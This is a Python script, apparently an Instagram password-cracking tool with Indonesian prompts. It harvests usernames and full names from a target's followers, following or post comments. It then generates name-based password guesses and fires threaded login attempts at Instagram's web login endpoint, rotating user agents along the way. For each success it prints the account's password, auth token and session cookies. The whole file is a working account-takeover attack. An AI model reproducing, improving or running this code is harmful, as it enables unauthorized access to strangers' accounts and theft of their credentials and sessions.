import urllib.parse
from urllib.parse import quote
import re, os, sys, json, random, urllib, urllib.request, hmac, hashlib, time, string, uuid, requests, base64,datetime,subprocess
from concurrent.futures import ThreadPoolExecutor
import requests,bs4,json,os,sys,random,datetime,time,re
from bs4 import BeautifulSoup as bsp
from rich.console import Console
from rich.panel import Panel 
from rich import print as prints
import threading
from rich.console import Console as sol
import time
from rich.tree import Tree
from rich.table import Table as me
import datetime
from rich.columns import Columns
from rich.progress import Progress,BarColumn,TextColumn,TimeElapsedColumn, SpinnerColumn
from string import *
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_v1_5

x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -

ses = requests.Session()
X_IG_APP_ID = random.choice(["936619743392459" , "2763362503905702" , "1217981644879628"])
xx = 0
rr = random.randint;rc = random.choice
console = Console()
Uid, Uuid , Uuid4,xyz= [], [], [],[]
Ok, Cp, Loop = 0, 0, 0
HEADERS   = {'Host': 'www.instagram.com','x-ig-app-id': X_IG_APP_ID,'x-ig-www-claim': 'hmac.AR2bJKYJnPYmZqv19akfq13Zn4tplhuXb9TC9PwFk03DgxmT','sec-ch-ua-mobile': '?1','user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36','accept': '*/*','x-requested-with': 'XMLHttpRequest','x-asbd-id': '129477','x-csrftoken': 'TeWMHnpFe4nja5IPA2bBUjOiVMwndp5E','sec-fetch-site': 'same-origin','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,ru;q=0.6,jv;q=0.5'}
ua = {'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3'}

dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
tgl = datetime.datetime.now().day
bln = dic[str(datetime.datetime.now().month)]
thn = datetime.datetime.now().year
Okc = 'OK-' + str(tgl) + '-' + str(bln) + '-' + str(thn) + '.txt'
Cpc = 'CP-' + str(tgl) + '-' + str(bln) + '-' + str(thn) + '.txt'



def UserAgent():
    model_nokia = random.choice(['TA-1021', 'TA-1033', 'TA-1000', 'TA-1003', 'TA-1025', 'TA-1039'])
    crom_ios = str(random.randint(1,99))+"."+str(random.randint(1,99)) + ".0"
    model_ios = str(random.randint(1, 11)) + ',' + str(random.randint(2, 9))
    versi_ios = str(random.randint(1, 9)) + '_' + str(random.randint(1, 9)) + '_' + str(random.randint(1, 9))
    ipad_ios = str(random.randint(1,9))
    android_version = random.choice(['24/7.0','26/8.0.0','23/6.0.1','22/5.1.1','21/5.0.1','21/5.0.2','25/7.1.1','19/4.4.4','21/5.0','19/4.4.2','27/8.1.0','28/9','29/10','26/9','29/10','30/11','25/7.1.2'])
    dpis = random.choice(['320dpi','640dpi','213dpi','480dpi','420dpi','240dpi','280dpi','160dpi','560dpi','540dpi','272dpi','360dpi','720dpi','270dpi','450dpi','600dpi','279dpi','210dpi','180dpi','510dpi','300dpi','454dpi','314dpi','288dpi','401dpi','153dpi','267dpi','345dpi','493dpi','340dpi','604dpi','465dpi','680dpi','256dpi','290dpi','432dpi','273dpi','120dpi','200dpi','367dpi','419dpi','306dpi','303dpi','411dpi','195dpi','518dpi','230dpi','384dpi','315dpi','293dpi','274dpi','235dpi'])
    pxl = random.choice(['720x1280','1440x2560','1440x2768','1280x720','1280x800','1080x1920','540x960','1080x2076','1080x2094','1080x2220','480x800','768x1024','1440x2792','1200x1920','720x1384','1920x1080','720x1369','800x1280','720x1440','1080x2058','600x1024','720x1396','2792x1440','1920x1200','2560x1440','1536x2048','720x1382','1080x2113','1080x2198','1080x2131','720x1423','1080x2069','720x1481','1080x2047','1080x2110','1080x2181','1080x2209','1080x2180','1080x2020','1080x2095','1440x2723','1080x2175','720x1365','1440x2699','1080x2218','2699x1440','1440x2907','1080x2257','720x1370','1080x2042','720x1372','1080x2200','1080x2186','720x1361','1080x2024','1080x2006','720x1402','1440x2831','720x1454','1080x2064','1440x2933','720x1411','720x1450','1440x2730','1080x2046','2094x1080','540x888','1440x2759','1080x2274','1080x2178','1440x2706','720x1356','720x1466','1440x2900','2560x1600','1080x2038','1600x2452','1080x2129','720x1422','720x1381','1080x2183','1080x2285','800x1216','1080x2216','1080x2168','1080x2119','1080x2128','1080x2273','2274x1080','1080x2162','1080x2164','2076x1080','1024x768','1080x2173','1440x2845','1080x2134','720x1379','1440x2838','1080x2139','2131x1080','1440x2744','1080x2192','720x1406','1440x2960','1080x2029','2042x1080','1080x2212','1406x720','1080x2288','2047x1080','1080x2051','720x1398','1280x736','1382x720','720x1353','1080x2050','1080x2028','1080x2256'])
    version_lang = random.choice(["hu_HU", "en_US", "en_UA", "en_PT", "pt_PT", "en_UA", "en_UA", "ru_BY", "ru_US", "uk_UA", "tr_TR", "de_DE", "ru_RU", "fr_FR", "en_PH", "ru_CZ", "en_UA", "ru_UA"])
    ua = f'Instagram 110.0.0.16.119 Android ({android_version}; {dpis}; {pxl}; HMD Global/Nokia; {model_nokia}; PL2;'
    ua1 = f'Instagram {crom_ios} (iPhone{model_ios}; iPhone OS {versi_ios}; {version_lang}; {version_lang}; scale={ipad_ios}.00; {pxl}'
    return random.choice([ua,ua1])



def Login():
    if os.path.isfile('.Cokies-IG.txt') is True:
        coki = {'cookie': open('.Cokies-IG.txt', 'r').read()}
    else:
        prints(Panel.fit(f"[bold white]Silahkan Masukan Cookies Akun Instagram Pastikan Menggunakan Akun Tumbal!",style="bold blue"))
        coki = input("\n└──╭➣ cookie: ")
    try:
        uid = re.search(r'ds_user_id=(\d+)', coki).group(1)
        req = requests.get(f'https://i.instagram.com/api/v1/users/{uid}/info/', headers=ua, cookies=coki).json()
        if 'user' in req:
            req = req['user']
            open('.Cokies-IG.txt', 'w').write(f'{coki}')
            full_name = req['full_name']
            username = req['username']
            follower_count = req['follower_count']
            following_count = req['following_count']
            media_count = req['media_count']
            return coki
        else:
            os.system('rm -rf .Cokies-IG.txt')
            prints(Panel.fit(f"[bold white]cookies Invalid Gunakan Cookies yang Lain!",style="bold red"))
            time.sleep(3)
            return None
    except Exception as e:
        os.system('rm -rf .Cokies-IG.txt')
        prints(Panel.fit(f"[bold white]cookies Invalid Gunakan Cookies yang Lain!",style="bold red"))
        time.sleep(3)
        return None

def menu():
    os.system('clear')
    aset = Login()
    if aset is None:
        time.sleep(3)
        return
    os.system('clear')
    prints(Panel(f"[bold white]1.[bold green] Dump From Follower[bold white] [ [bold yellow]Limited[bold white] ]\n[bold white]2.[bold green] Dump From Following[bold white] [ [bold yellow]Limited[bold white] ]\n[bold white]3.[bold green] Dump From Komentar Post [bold white] [ [bold yellow]Limited[bold white] ]",style='blue'))
    x = input('└──╭➣ Pilih 1 Sampai 3 : ')
    if x in ['01','1']:
        Follower(aset)
    elif x in ['02','2']:
        Folowing(aset)
    elif x in ['03','3']:
        komentar(aset)
    elif x in ['00','0']:
        os.system('rm -rf .Cokies-IG.txt')
        print("berhasil menghapus cookies")
        exit()


def Folowing(kuki, xyz=[]):
	if 'csrftoken' not in str(kuki):
		try:
			memek = requests.get('https://www.instagram.com/data/shared_data/', cookies=kuki).json()
			token = memek['config']['csrf_token']
			kuki['cookie'] += ';csrftoken=%s;' % (token)
		except:
			os.system('rm -rf .Cokies-IG.txt')
			exit()
	prints(Panel.fit(f"[bold white] Masukan Target Username Anda",style='bold blue'))      
	users = input(f'└──╭➣ Targets User : {b}').split(',')
	prints(f"\n[bold white]└──╭➣ Process Collecting Username.....")         
	threads = []
	for y in users:
		thread = threading.Thread(target=processFolowing, args=(y, kuki, xyz))
		threads.append(thread)
		thread.start()
	for thread in threads:
		thread.join()
	print("")
	Metode()

def processFolowing(user, kuki, xyz):
	req = requests.get(f'https://www.instagram.com/{user}/', cookies=kuki).text
	match = re.search(r'"user_id":"(\d+)"', str(req))
	if match:
		uid = match.group(1)
		if uid not in xyz:
			xyz.append(uid)
		GraphqlFollowing('following', uid, kuki['cookie'], '')

def GraphqlFollowing(typess, userid, cokie,after):
    global xx
    api = "https://www.instagram.com/graphql/query/"
    csr = 'variables={"id":"%s","first":24,"after":"%s"}'%(userid,after)
    mek = "query_hash=37479f2b8209594dde7facb0d904896a&{}".format(csr)
    try:
        ptk = {"user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36","accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7","cookie": cokie}
        req = requests.get(api, params=mek, headers=ptk).json()
        if 'require_login' in req:
            if len(Uuid) > 0:
                pass
            else:
                exit(f'\nInvalid Cookie')
        for xyz in req['data']['user']['edge_followed_by']['edges']:
            xy = xyz['node']['username'] + '|' + xyz['node']['full_name']
            if xy not in Uuid:
                xx += 1
                Uuid.append(xy)
                print('\r└──╭➣ Mendapatkan ID {}'.format(len(Uuid)), end='')
                time.sleep(0.0009)
                open('dump.txt', 'w').write('\n'.join(Uuid))
        end = req['data']['user']['edge_followed_by']['page_info']['has_next_page']
        if end is True:
            after = req['data']['user']['edge_followed_by']['page_info']['end_cursor']
            GraphqlFollowing(typess, userid, cokie, after)
        else:pass
    except:pass
def Follower(kuki,xyz=[]):
    if 'csrftoken' not in str(kuki):
        try:
            memek = requests.get('https://www.instagram.com/data/shared_data/', cookies=kuki).json()
            token = memek['config']['csrf_token']
            kuki['cookie'] += ';csrftoken=%s;' % (token)
        except:
            os.system('rm -rf .Cokies-IG.txt')
            exit()
    prints(Panel.fit(f"[bold white] Masukan Target Username Anda",style='bold blue'))      
    users = input(f'└──╭➣ Targets User : {b}').split(',')
    prints(f"\n[bold white]└──╭➣ Process Collecting Username.....")         
    threads = []
    for y in users:
        thread = threading.Thread(target=procesfol, args=(y, kuki, xyz))
        threads.append(thread)
        thread.start()
    for thread in threads:
        thread.join()
    print("")
    Metode()
    
def procesfol(user, kuki, xyz):
	req = requests.get(f'https://www.instagram.com/{user}/', cookies=kuki).text
	match = re.search(r'"user_id":"(\d+)"', str(req))
	if match:
		uid = match.group(1)
		if uid not in xyz:
			xyz.append(uid)
		GraphqlFolower('followers', uid, kuki['cookie'], '')

def GraphqlFolower(typess, userid, cokie,after):
    global xx
    api = "https://www.instagram.com/graphql/query/"
    csr = 'variables={"id":"%s","first":24,"after":"%s"}'%(userid,after)
    mek = "query_hash=58712303d941c6855d4e888c5f0cd22f&{}".format(csr)
    try:
        ptk = {"user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36","accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7","cookie": cokie}
        req = requests.get(api, params=mek, headers=ptk).json()
        if 'require_login' in req:
            if len(Uuid) > 0:
                pass
            else:
                exit(f'\nInvalid Cookie')
        for xyz in req['data']['user']['edge_follow']['edges']:
            xy = xyz['node']['username'] + '|' + xyz['node']['full_name']
            if xy not in Uuid:
                xx += 1
                Uuid.append(xy)
                print('\r└──╭➣ Mendapatkan ID {}'.format(len(Uuid)), end='')
                time.sleep(0.0009)
                open('dump.txt', 'w').write('\n'.join(Uuid))
        end = req['data']['user']['edge_follow']['page_info']['has_next_page']
        if end is True:
            after = req['data']['user']['edge_follow']['page_info']['end_cursor']
            GraphqlFolower(typess, userid, cokie, after)
        else:pass
    except:pass

def komentar(cokie, dav=[]):
	prints(Panel.fit('[bold white]Masukan link postingan atau reels. bisa di pisahkan dengan koma',style='bold blue'))
	link = input(f'└──╭➣ Masukan Link :').split(',')
	try:
		for ling in link:
			r = requests.get(ling, cookies=cokie).text
			o = re.search('"media_id":"(\d+)"', str(r)).group(1)
			dav.append(o)
		for x in dav:
			dump_komen(cokie, x, '')
	except:pass
	Metode()

def dump_komen(cokie, uid, min):
	global xx
	try:
		r = requests.get(f"https://i.instagram.com/api/v1/media/{uid}/comments/?can_support_threading=true&permalink_enabled=false&min_id={min}", cookies = cokie, headers={'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3',}).json()
		for i in r['comments']:
			a = i['user']['username'] +'|'+ i['user']['full_name']
			if a not in Uuid:
				Uuid.append(a)
				xx +=1
				print(f'└──╭➣ Berhasil dump [ {xx} ] id [ {uid} ]',end='\r')
		if 'next_min_id' in str(r):
			dump_komen(cokie, uid, r['next_min_id'])
	except:pass

def Metode(): 
    global Login_Dengan
    prints(Panel(f"[bold white]Total Username Terkumpul : [bold green]{len(Uuid)}[bold white]",style=f"bold blue"))
    prints(Panel(f"[bold white]1.[bold green] Login Instagram With Web",style='blue'))
    method = input('└──╭➣ Pilih Metode 1 Sampai 4: ')
    if method in ['01','1']: Login_Dengan = "web.instagram.com"
    else:Login_Dengan = "web.instagram.com"
    SetCrack()

def SetCrack():
	global prog,des
	prints(Panel(f"[bold white]Crack Di Mulai Tekan [bold green]'Ctrl+Z'[bold white] Di Keyboard Anda Jika Ingin Berhenti\n[bold white]Hidupkan Mode Pesawat 5 Detik Jika Terdeteksi Spam IP",style=f"bold blue"))
	prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
	des = prog.add_task('',total=len(Uuid))
	with prog:
		with ThreadPoolExecutor (max_workers=30) as ASF:
			for i in Uuid:
				try:
					username, name = i.split('|')
					kontol = Password(name)
					if Login_Dengan == "web.instagram.com":
						ASF.submit(crack_ajax, username, kontol)
				except:pass
		exit(' \n\n Crack Telah Selesai')
	
def Password(name):
	xxzx = []
	full = name.replace('_', ' ').replace('.', ' ').replace('@', ' ')
	for nama in full.split(' '):
		if len(nama) < 3: 
			continue
		base_nama = nama.replace(' ', '')
		xxzx.append(base_nama)
		xxzx.append(base_nama + '01')
		xxzx.append(base_nama + '02')
		xxzx.append(base_nama + '03')
		xxzx.append(base_nama + '04')
		xxzx.append(base_nama + '05')
		xxzx.append(base_nama + '06')
		xxzx.append(base_nama + '07')
		xxzx.append(base_nama + '08')
		xxzx.append(base_nama + '09')
		xxzx.append(base_nama + '10')
		if len(nama) >= 4:
			xxzx.append(base_nama + '12')        	
			xxzx.append(base_nama + '123')
			xxzx.append(base_nama + '1234')
			xxzx.append(base_nama + '12345')
			xxzx.append(base_nama + '123456')
		else:
			xxzx.append('kamu nanya')
			xxzx.append('sayangku123')
			xxzx.append('Bengkulu')
	return xxzx
        
KEY_ID = "111"  # Sesuaikan dengan key ID terbaru dari IG
VERSION = "11"  # Sesuaikan dengan versi terbaru IG

def encrypt_password(password: str) -> str:
    """Enkripsi password dengan RSA menggunakan kunci publik Instagram"""
    timestamp = int(time.time())  # Ambil waktu sekarang
    rsa_key = RSA.import_key('583d7450e560cda1f904c30bbea7e5a447c09b7ed07772d6017034ec91e8f609')  # Load kunci publik
    cipher = PKCS1_v1_5.new(rsa_key)  # Inisialisasi cipher RSA
    encrypted_password = cipher.encrypt(f"{timestamp}:{password}".encode())  # Enkripsi password
    encoded_password = base64.b64encode(encrypted_password).decode()  # Encode base64

    return f"#PWD_INSTAGRAM_BROWSER:{VERSION}:{timestamp}:{encoded_password}"

def crack_ajax(username, memek):
    global Ok, Cp, Loop
    prog.update(des, description=f'Running [ {Loop} ] [ {str(len(Uuid))} ] True [ {Ok} ] False [ {Cp} ]')
    prog.advance(des)
    
    for password in memek:
        try:
            sesi = requests.Session()
            csrf_response = sesi.get("https://www.instagram.com/")
            csrftoken = csrf_response.cookies.get("csrftoken", "missing")
            
            if csrftoken == "missing":
                prints("[red]Gagal mendapatkan CSRF token![/red]")
                continue
            
            user_agent = UserAgent()
            headers = {
                "accept": "*/*",
                "accept-encoding": "gzip, deflate, br, zstd",
                "accept-language": "en-US,en;q=0.9",
                "content-type": "application/x-www-form-urlencoded",
                "origin": "https://www.instagram.com",
                "referer": "https://www.instagram.com/",
                "sec-ch-prefers-color-scheme": "dark",
                "sec-ch-ua": '"Not A(Brand";v="8", "Chromium";v="132", "Google Chrome";v="132"',
                "sec-ch-ua-mobile": "?0",
                "sec-ch-ua-platform": "macOS",
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
                "user-agent": user_agent,
                "x-asbd-id": "129477",
                "x-csrftoken": csrftoken,
                "x-ig-app-id": "1217981644879628",
                "x-ig-www-claim": "0",
                "x-instagram-ajax": "1019816541",
                'x-requested-with': f'{random.choice(["XMLHttpRequest","com.instagram.lite","com.instagram.android","com.facebook.appmanager"])}'
            }
            
            data = {
                "enc_password": f"#PWD_INSTAGRAM_BROWSER:0:{int(time.time())}:{password}",
                "username": username,
                "queryParams": "{}",
                "optIntoOneTap": "false",
                "trustedDeviceRecords": "{}",
            }
            
            response = sesi.post(
                "https://www.instagram.com/api/v1/web/accounts/login/ajax/",
                data=data,
                headers=headers
            )
            
            if 'logged_in_user' in response.text:
                Ok += 1
                ig_set_authorization = response.headers.get('ig-set-authorization', 'Tidak Ada')
                cookie = "; ".join([f"{k}={v}" for k, v in sesi.cookies.get_dict().items()])
                
                tree = Tree(Panel.fit("[green]Login Berhasil[/green]"))
                tree.add(Panel.fit(f"Username: [green]{username}[/green]"))
                tree.add(Panel.fit(f"Password: [green]{password}[/green]"))
                tree.add(Panel.fit(f"Token: [green]{ig_set_authorization}[/green]"))
                tree.add(Panel.fit(f"Cookie: [green]{cookie}[/green]"))
                prints(tree)
                break  # Hentikan loop jika berhasil login
            
            elif 'challenge_required' in response.text:
                Cp += 1
                cookie = "; ".join([f"{k}={v}" for k, v in sesi.cookies.get_dict().items()])
                
                tree = Tree(Panel.fit("[yellow]Login Challenge Required[/yellow]"))
                tree.add(Panel.fit(f"Username: [yellow]{username}[/yellow]"))
                tree.add(Panel.fit(f"Password: [yellow]{password}[/yellow]"))
                tree.add(Panel.fit(f"Cookies Challenge: [yellow]{cookie}[/yellow]"))
                prints(tree)
            
        except requests.exceptions.ConnectionError:
            prints("[red]Koneksi terputus, mencoba kembali dalam 5 detik...[/red]")
            time.sleep(5)
    
    Loop += 1

if __name__=='__main__':
	menu()
